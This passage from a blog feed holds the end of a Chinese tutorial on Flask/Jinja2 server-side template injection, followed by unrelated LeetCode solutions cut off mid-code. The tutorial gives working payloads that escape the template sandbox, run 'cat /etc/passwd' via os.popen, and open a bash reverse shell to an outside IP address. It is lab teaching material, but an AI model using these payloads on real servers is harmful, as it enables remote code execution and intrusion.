class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.100.163.201:5000/ssti?code=test</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/5.png" alt="5"></p><h5 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.100.163.201:5000/ssti?code=%3Cscript%3Ealert(1)%3C/script%3E</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/6.png" alt="6"></p><h4 id="SSTI读取环境变量"><a href="#SSTI读取环境变量" class="headerlink" title="SSTI读取环境变量"></a>SSTI读取环境变量</h4><p>对于Flask的模版渲染而言，如果我们要让服务器执行代码，需要将执行的命令包裹在<code>{ {} }</code>中，对于一个GET请求，包裹在<code>{ {} }</code>中的参数会被后端计算，然后将结果拼接到模版中，完成渲染后返回给用户。</p><h5 id="request-environ"><a href="#request-environ" class="headerlink" title="request.environ"></a>request.environ</h5><p><code>request</code>是Flask框架中的一个全局对象，当我们访问<code>request</code>时可以看到当前的请求</p><p><img src="/2021/11/29/SSTI模版注入/7.png" alt="7"></p><p>在<code>request</code>对象中有一个<code>environ</code>对象名，<code>request.environ</code>是一个与服务器环境相关的对象字典</p><p><img src="/2021/11/29/SSTI模版注入/8.png" alt="8"></p><h5 id="config-items"><a href="#config-items" class="headerlink" title="config.items"></a>config.items</h5><p><code>congfig</code>也是Flask框架中的一个全局对象，其中也包含一些敏感信息</p><p><img src="/2021/11/29/SSTI模版注入/9.png" alt="9"></p><h4 id="SSTI任意文件读写"><a href="#SSTI任意文件读写" class="headerlink" title="SSTI任意文件读写"></a>SSTI任意文件读写</h4><p>对于任意文件读写，我们可以通过python的<code>os</code>模块实现，在Jinja2中是可以直接访问python的一些对象及其方法的，如字符串对象及其upper函数，列表对象及其count函数，字典对象及其has_key函数,那么怎么能够在Jinja2模板中访问到python中的内置变量并且可以调用对应变量类型的方法，这就使用到了python沙盒逃逸。</p><h5 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h5><p>沙箱逃逸就是在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限的过程，这就需要执行一些命令，在python中，可执行命令的模块有如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os</span><br><span class="line">pty</span><br><span class="line">subprocess</span><br><span class="line">platform</span><br><span class="line">commands</span><br></pre></td></tr></table></figure><h5 id="python魔法函数"><a href="#python魔法函数" class="headerlink" title="python魔法函数"></a>python魔法函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__ 返回调用的类型</span><br><span class="line">__mro__ 查看类继承的所有父类，直到object</span><br><span class="line">__subclasses__ 获取类所有的子类</span><br><span class="line">__bases__ 返回所有直接父类组成的元组</span><br><span class="line">__init__ 类实例创建之后调用，对当前对象的实例的一些初始化</span><br><span class="line">__globals__ 能够返回函数所在模块命名空间的所有变量</span><br><span class="line">__getattribute__ 当类被调用的时候，无条件进入此函数</span><br><span class="line">__getattr__ 对象中不存在的属性时调用</span><br></pre></td></tr></table></figure><p>对于获取到os类从而达到命令执行的效果，具体的操作如下</p><h5 id="获取字符串的类对象"><a href="#获取字符串的类对象" class="headerlink" title="获取字符串的类对象"></a>获取字符串的类对象</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/10.png" alt="10"></p><h5 id="寻找基类"><a href="#寻找基类" class="headerlink" title="寻找基类"></a>寻找基类</h5><p>这一步的目的是利用继承关系找到object类</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/11.png" alt="11"></p><h5 id="寻找可引用类"><a href="#寻找可引用类" class="headerlink" title="寻找可引用类"></a>寻找可引用类</h5><p>在object类下查找所有的子类，然后查找到可利用的类</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()</span><br><span class="line">[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'dict_reversekeyiterator'&gt;, &lt;class 'dict_reversevalueiterator'&gt;, &lt;class 'dict_reverseitemiterator'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'pickle.PickleBuffer'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'InterpreterID'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'BaseException'&gt;, &lt;class 'hamt'&gt;, &lt;class 'hamt_array_node'&gt;, &lt;class 'hamt_bitmap_node'&gt;, &lt;class 'hamt_collision_node'&gt;, &lt;class 'keys'&gt;, &lt;class 'values'&gt;, &lt;class 'items'&gt;, &lt;class 'Context'&gt;, &lt;class 'ContextVar'&gt;, &lt;class 'Token'&gt;, &lt;class 'Token.MISSING'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'posix.ScandirIterator'&gt;, &lt;class 'posix.DirEntry'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'zipimport._ZipImportResourceReader'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_abc._abc_data'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'types.GenericAlias'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class 'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'itertools.accumulate'&gt;, &lt;class 'itertools.combinations'&gt;, &lt;class 'itertools.combinations_with_replacement'&gt;, &lt;class 'itertools.cycle'&gt;, &lt;class 'itertools.dropwhile'&gt;, &lt;class 'itertools.takewhile'&gt;, &lt;class 'itertools.islice'&gt;, &lt;class 'itertools.starmap'&gt;, &lt;class 'itertools.chain'&gt;, &lt;class 'itertools.compress'&gt;, &lt;class 'itertools.filterfalse'&gt;, &lt;class 'itertools.count'&gt;, &lt;class 'itertools.zip_longest'&gt;, &lt;class 'itertools.permutations'&gt;, &lt;class 'itertools.product'&gt;, &lt;class 'itertools.repeat'&gt;, &lt;class 'itertools.groupby'&gt;, &lt;class 'itertools._grouper'&gt;, &lt;class 'itertools._tee'&gt;, &lt;class 'itertools._tee_dataobject'&gt;, &lt;class 'operator.itemgetter'&gt;, &lt;class 'operator.attrgetter'&gt;, &lt;class 'operator.methodcaller'&gt;, &lt;class 'reprlib.Repr'&gt;, &lt;class 'collections.deque'&gt;, &lt;class '_collections._deque_iterator'&gt;, &lt;class '_collections._deque_reverse_iterator'&gt;, &lt;class '_collections._tuplegetter'&gt;, &lt;class 'collections._Link'&gt;, &lt;class 'functools.partial'&gt;, &lt;class 'functools._lru_cache_wrapper'&gt;, &lt;class 'functools.partialmethod'&gt;, &lt;class 'functools.singledispatchmethod'&gt;, &lt;class 'functools.cached_property'&gt;, &lt;class 'contextlib.ContextDecorator'&gt;, &lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;, &lt;class 'enum.auto'&gt;, &lt;enum 'Enum'&gt;, &lt;class 're.Pattern'&gt;, &lt;class 're.Match'&gt;, &lt;class '_sre.SRE_Scanner'&gt;, &lt;class 'sre_parse.State'&gt;, &lt;class 'sre_parse.SubPattern'&gt;, &lt;class 'sre_parse.Tokenizer'&gt;, &lt;class 're.Scanner'&gt;, &lt;class 'typing._Final'&gt;, &lt;class 'typing._Immutable'&gt;, &lt;class 'typing.Generic'&gt;, &lt;class 'typing._TypingEmpty'&gt;, &lt;class 'typing._TypingEllipsis'&gt;, &lt;class 'typing.Annotated'&gt;, &lt;class 'typing.NamedTuple'&gt;, &lt;class 'typing.TypedDict'&gt;, &lt;class 'typing.io'&gt;, &lt;class 'typing.re'&gt;, &lt;class 'importlib.abc.Finder'&gt;, &lt;class 'importlib.abc.Loader'&gt;, &lt;class 'importlib.abc.ResourceReader'&gt;, &lt;class 'rlcompleter.Completer'&gt;]</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/12.png" alt="12"></p><h5 id="寻找含有os库的类"><a href="#寻找含有os库的类" class="headerlink" title="寻找含有os库的类"></a>寻找含有os库的类</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__mro__[<span class="number">-1</span>].__subclasses__():</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">  <span class="comment">#在初始化属性中，带wrapper的表示没有重载，因此我们寻找没有带wrapper</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"warpper"</span> <span class="keyword">in</span> repr(i.__init__):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">      <span class="comment">#__globals__全局方法，查找当前类包含的所有方法和变量及参数</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"os"</span> <span class="keyword">in</span> repr(i.__init__.__globals__):</span><br><span class="line">print(count, i)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">64</span> &lt;<span class="class"><span class="keyword">class</span> '_<span class="title">frozen_importlib</span>._<span class="title">ModuleLock</span>'&gt;</span></span><br><span class="line"><span class="class">65 &lt;class '_frozen_importlib._DummyModuleLock'&gt;</span></span><br><span class="line"><span class="class">66 &lt;class '_frozen_importlib._ModuleLockManager'&gt;</span></span><br><span class="line"><span class="class">67 &lt;class '_frozen_importlib._installed_safely'&gt;</span></span><br><span class="line"><span class="class">68 &lt;class '_frozen_importlib.ModuleSpec'&gt;</span></span><br><span class="line"><span class="class">79 &lt;class '_frozen_importlib_external.FileLoader'&gt;</span></span><br><span class="line"><span class="class">80 &lt;class '_frozen_importlib_external._NamespacePath'&gt;</span></span><br><span class="line"><span class="class">81 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;</span></span><br><span class="line"><span class="class">83 &lt;class '_frozen_importlib_external.FileFinder'&gt;</span></span><br><span class="line"><span class="class">117 &lt;class 'os._wrap_close'&gt;</span></span><br><span class="line"><span class="class">147 &lt;class 'reprlib.Repr'&gt;</span></span><br><span class="line"><span class="class">154 &lt;class 'functools.partialmethod'&gt;</span></span><br><span class="line"><span class="class">161 &lt;class 'sre_parse.Pattern'&gt;</span></span><br><span class="line"><span class="class">162 &lt;class 'sre_parse.SubPattern'&gt;</span></span><br><span class="line"><span class="class">163 &lt;class 'sre_parse.Tokenizer'&gt;</span></span><br><span class="line"><span class="class">164 &lt;class 're.Scanner'&gt;</span></span><br></pre></td></tr></table></figure><p>在上述中寻找是否存在文件读取的方法，例如<code>open</code>、<code>popen</code>、<code>file</code>等，最后我们在<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类中找到了<code>popen</code>函数，从而可以达到任意文件读取的效果。</p><p>payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/13.png" alt="13"></p><p>也可以使用Flask框架中的<code>config</code>全局对象来读取任意文件，payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()</span><br></pre></td></tr></table></figure><h4 id="SSTI反弹Shell"><a href="#SSTI反弹Shell" class="headerlink" title="SSTI反弹Shell"></a>SSTI反弹Shell</h4><p>因为我们可以调用到os模块，因此可以执行反弹shell，我现在自己的服务器上启动监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM-20-13-centos ~&gt; nc -lvvp 9527</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9527</span><br><span class="line">Ncat: Listening on 0.0.0.0:9527</span><br></pre></td></tr></table></figure><p><code>nc</code>命令部分参数介绍</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-h 帮助信息</span><br><span class="line">-i secs 延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 连接关闭后,仍然继续监听</span><br><span class="line">-n 指定数字的IP地址，不能用hostname</span><br><span class="line">-o file 记录16进制的传输</span><br><span class="line">-p port 本地端口号</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-t 使用TELNET交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出--用两个-v可得到更详细的内容</span><br><span class="line">-w secs timeout的时间</span><br><span class="line">-z 将输入输出关掉--用于扫描时</span><br></pre></td></tr></table></figure><p>反弹shell的payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('bash -i &gt;&amp; /dev/tcp/42.193.150.138/9527 0&gt;&amp;1').read()</span><br></pre></td></tr></table></figure><p>但是因为存在<code>&amp;</code>字符，因此在URL解析中会出错，因此我们可以使用Burp构造</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ssti?code=&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('bash%20-i%20&gt;%26%20/dev/tcp/42.193.150.138/9527%200&gt;%261').read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/14.png" alt="14"></p><p>成功连接</p><p><img src="/2021/11/29/SSTI模版注入/15.png" alt="15"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;SSTI(Server-Side Template Injection)漏洞是模版引擎在使用渲染函数的时候，由于代码不规范而导致的代码注入漏
      
    
    </summary>
    
    
      <category term="web安全" scheme="elssm.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>近期Leetcode题解</title>
    <link href="elssm.github.io/2021/11/24/%E8%BF%91%E6%9C%9FLeetcode%E9%A2%98%E8%A7%A3/"/>
    <id>elssm.github.io/2021/11/24/近期Leetcode题解/</id>
    <published>2021-11-24T04:12:45.000Z</published>
    <updated>2021-11-26T13:00:09.473Z</updated>
    
    <content type="html"><![CDATA[<h4 id="剑指-Offer-43-1～n-整数中-1-出现的次数-hard"><a href="#剑指-Offer-43-1～n-整数中-1-出现的次数-hard" class="headerlink" title="剑指 Offer 43. 1～n 整数中 1 出现的次数(hard)"></a>剑指 Offer 43. 1～n 整数中 1 出现的次数(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">countDigitOne</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        对于305295这个数而言</span></span><br><span class="line"><span class="string">        我们假设从百位开始算，百位前面305计为a,百位后面95计为b，百位数等于n%100，100计为base</span></span><br><span class="line"><span class="string">        当百位数大于1的时候</span></span><br><span class="line"><span class="string">            百位数的前半段可以取值为0～305，一共有a+1个数，后半段可以取0～99，一共有base个数</span></span><br><span class="line"><span class="string">            则百位上1能取到的个数是(a+1)*base个数</span></span><br><span class="line"><span class="string">        对于305195这个数而言</span></span><br><span class="line"><span class="string">        当百位数等于1的时候，分两种情况</span></span><br><span class="line"><span class="string">            1.百位数的前半段可以取值为0～304，一共有a个数，后半段可以取0～99，一共有base个数。</span></span><br><span class="line"><span class="string">            2.百位数的前半段可以取值为305，一共有1个数，后半段可以取0～95，一共有b+1个数。</span></span><br><span class="line"><span class="string">            则百位上1能取到的个数是(a*base+1*(b+1))个数</span></span><br><span class="line"><span class="string">        对于305095这个数而言</span></span><br><span class="line"><span class="string">        当百位数小于1的时候</span></span><br><span class="line"><span class="string">            百位数的前半段可以取值为0～304，一共有a个数，后半段可以取0～99，一共有base个数</span></span><br><span class="line"><span class="string">            则百位上1能取到的个数是(a*base)个数</span></span><br><span class="line"><span class="string">        之后while循环分三种情况统计每一位上1的个数即可</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        base = <span class="number">1</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> base &lt;= n:</span><br><span class="line">            b = n % base</span><br><span class="line">            a = n // base</span><br><span class="line">            cur = a % <span class="number">10</span></span><br><span class="line">            a //= <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> cur &gt; <span class="number">1</span>:</span><br><span class="line">                res += (a + <span class="number">1</span>) * base</span><br><span class="line">            <span class="keyword">elif</span> cur == <span class="number">1</span>:</span><br><span class="line">                res += (a * base + b + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += a * base</span><br><span class="line">            base *= <span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-51-数组中的逆序对-hard"><a href="#剑指-Offer-51-数组中的逆序对-hard" class="headerlink" title="剑指 Offer 51. 数组中的逆序对(hard)"></a>剑指 Offer 51. 数组中的逆序对(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reversePairs</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        通过不断地插入值来寻找前面大于当前值的元素个数</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = <span class="number">0</span> <span class="comment">#统计计数</span></span><br><span class="line">        sorted_nums = [] <span class="comment">#准备一个待插入的列表</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="comment">#找到nums中当前数在sorted_nums中要插入的下标</span></span><br><span class="line">            k = bisect.bisect(sorted_nums, nums[i]) </span><br><span class="line">            <span class="comment">#当前下标减去要插入的下标就是在大于当前数的个数</span></span><br><span class="line">            res += i - k</span><br><span class="line">            sorted_nums[k:k] = [nums[i]] <span class="comment">#插入当前元素</span></span><br><span class="line">            <span class="comment"># bisect.insort(sorted_nums,nums[i]) #插入当前元素</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-60-n个骰子的点数-medium"><a href="#剑指-Offer-60-n个骰子的点数-medium" class="headerlink" title="剑指 Offer 60. n个骰子的点数(medium)"></a>剑指 Offer 60. n个骰子的点数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import numpy as np</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dicesProbability</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: List[float]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#卷积做法</span></span><br><span class="line">        <span class="comment"># conv1 = [1.0/6 for i in range(6)]</span></span><br><span class="line">        <span class="comment"># if n==1:</span></span><br><span class="line">        <span class="comment">#     return conv1</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     convN = self.dicesProbability(n-1)</span></span><br><span class="line">        <span class="comment">#     return np.convolve(convN,conv1)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        dp = [<span class="number">1.0</span>/<span class="number">6</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">6</span>)] <span class="comment">#骰子数为1时候的值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="comment">#tmp长度为n个骰子能取到的值的个数，全部初始化为0</span></span><br><span class="line">            tmp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(i*<span class="number">5</span>+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(dp)): <span class="comment">#n-1个骰子取到的所有值</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">6</span>): <span class="comment">#加上第n个骰子取得的值</span></span><br><span class="line">                    tmp[j+k] += 